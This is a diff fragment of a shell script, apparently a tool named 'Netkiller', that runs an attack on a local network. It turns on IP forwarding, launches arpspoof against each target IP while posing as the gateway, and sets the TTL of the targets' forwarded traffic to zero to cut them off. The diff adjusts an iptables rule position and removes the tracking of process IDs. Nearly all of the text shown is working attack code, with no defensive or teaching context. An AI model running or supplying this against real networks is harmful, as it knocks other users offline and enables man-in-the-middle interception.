@@ -23,7 +23,7 @@ fi
 # IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -I FORWARD 1 -m state --state ESTABLISHED,RELATED -j ACCEPT
 echo " "
 
 # Functions for clean up
@@ -230,11 +230,9 @@ fi
 echo " "
 
 # Start ARP spoofing for each target
-PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     PIDS+=($!)
      iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
      iptables -t mangle -A PREROUTING -s "$TARGET" -j TTL --ttl-set 0
 done
